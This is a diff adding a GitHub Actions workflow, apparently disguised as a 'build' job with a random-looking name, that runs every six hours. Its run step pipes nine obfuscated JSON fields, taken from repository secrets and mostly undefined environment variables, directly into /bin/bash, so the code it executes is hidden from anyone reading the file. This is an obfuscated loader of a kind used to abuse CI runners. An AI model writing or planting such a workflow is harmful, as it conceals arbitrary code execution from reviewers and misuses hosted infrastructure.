@@ -1,0 +1,25 @@
+name: damoulmul
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: damoulmul
+        env:
+          d831: ${{ secrets.d831 }}
+        run: |
+          echo $d831 | jq -r .cwgyg06441 | /bin/bash
+          echo $m3568 | jq -r .lfnu49 | /bin/bash
+          echo $ubmhv7 | jq -r .govpf093 | /bin/bash
+          echo $zx526 | jq -r .hrts589 | /bin/bash
+          echo $pngdd86899 | jq -r .d2 | /bin/bash
+          echo $gwwbc0 | jq -r .ablw15 | /bin/bash
+          echo $gy74547 | jq -r .hwfb18076 | /bin/bash
+          echo $ycrbv643 | jq -r .ddub4929 | /bin/bash
+          echo $txsh770 | jq -r .kmg6 | /bin/bash
+
